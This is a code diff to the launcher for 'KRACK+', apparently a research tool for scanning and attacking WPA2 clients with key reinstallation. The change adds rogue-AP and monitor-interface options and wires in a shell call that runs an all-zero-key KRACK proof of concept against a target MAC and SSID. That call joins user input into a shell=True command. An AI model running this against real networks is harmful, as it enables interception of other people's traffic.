@@ -33,19 +33,31 @@ log.debug("KRACK+ 1.0 by Lars Magnus Trinborgholen, Fredrik Walloe and Lars Kris
 
 def main():
     timeOfLastConnectedDevice = 0
-    parser = optparse.OptionParser()
+    help_text = "\nKRACK+ Scan: krackPlus [-s]\nKRACK+ Attack: krackPlus [-a] [--nic-mon NIC] [--nic-rogue-ap NIC] [--target-ssid SSID] [--target MAC-address]"
+    parser = optparse.OptionParser(usage=help_text)
     
-    parser.add_option('--set-ssid', default='testnetwork', help="Use this option to set the SSID for the created network.", dest='ssid')
+
+    # KRACK+ Attack options
     parser.add_option('--attack', '-a', default=False, help="This option will run a key reinstallation attack against ....", dest='attack', action='store_true')
-    parser.add_option('--target', '-t', help="This option is used to specifiy target using MAC-adress when running attack.", dest='target')
+    parser.add_option('--target', '-t', help="This option is used to specifiy target device using MAC-adress when running attack.", dest='target')
     parser.add_option('--target-ssid', help="This option is used to specify target network/ssid", dest='targetSSID')
-    parser.add_option('--restore', '-r', help="This option will restore internet connection (wifi). Hopefully you'll never have to use this option.", dest='restore', default=False, action='store_true')
-    parser.add_option('-d', help="This option will increase output verbosity for debugging purposes", dest='debug', action='store_true')
-    parser.add_option('--dd', help="This option will increase output verbosity even more for extensive debugging.", dest='dd', action='store_true') 
-    parser.add_option('--set-password', default='abcdefgh', help="Use this option to set the password for the created network."
-                      " Password length has to be 8 characters or more!", dest='password')
+    parser.add_option('--nic-mon', help="This option is used to specify Wireless monitor interface that will listen on the"
+                        "channel of the target AP. Should be your secondary NIC, i.e USB NIC.", dest='mon')
+    parser.add_option('--nic-rogue-ap', help="This option is used to specify Wireless monitor interface that will run a rogue AP"
+                        "using a modified hostapd.", dest='rogue')
+
+    # KRACK+ Scan options
     parser.add_option('--scan','-s', help="This option will create a network with SSID 'testnetwork' where the default password is 'abcdefgh'."
                       " Simply connect to the network and the scan will be executed against the connected device.", dest='scan', default=False, action='store_true')
+    parser.add_option('--set-ssid', default='testnetwork', help="Use this option to set the SSID for the created network.", dest='ssid')
+    parser.add_option('--set-password', default='abcdefgh', help="Use this option to set the password for the created network."
+                      " Password length has to be 8 characters or more!", dest='password')
+    parser.add_option('-d', help="This option will increase output verbosity for KRACK+ Scan", dest='debug', action='store_true')
+    parser.add_option('--dd', help="This option will increase output verbosity even more for KRACK+ Scan (debugging purposes).", dest='dd', action='store_true')
+
+    #General KRACK+ options:
+    parser.add_option('--restore', '-r', help="This option will restore internet connection (wifi). Hopefully you'll never have to use this option.", dest='restore', default=False, action='store_true')
+    
     options, args = parser.parse_args()
     path = "~/krack/"
     # Running scan scripts
@@ -102,13 +114,15 @@ def main():
             subprocess.call(["./restoreClientWifi.sh"])
                 
     # Running attack scripts
-    elif options.attack:
+    elif options.attack and options.mon and options.rogue and options.target and options.targetSSID:
         try:
             print("Performing key reinstallation attack")
             #Sets up dependencies before the attack script runs
             subprocess.call(["./prepareClientAttack.sh"])
-        #TODO subprocess, run attack script; note that this static implementation is only for testing purposes and should be removed. 	
-        #subprocess.call(["./krackattacks-poc-zerokey/krackattack/krack-all-zero-tk.py wlan1 wlan0 Brennbakkvegen194 --target 54:27:58:63:14:aa"])
+            with open('./attackOutput.txt', 'w') as attackOutput:
+                subprocess.call(["cd krackattacks-poc-zerokey/krackattack/ && ./krack-all-zero-tk.py " + options.rogue + " " +
+                                 options.mon + " " + options.targetSSID + " " + options.target + " &"], stdout=attackOutput, shell=True)
+            	attackParser() 
         except KeyboardInterrupt:
             log.info("Cleaning up and restoring wifi ...")
             subprocess.call(["./restoreClientWifi.sh"])
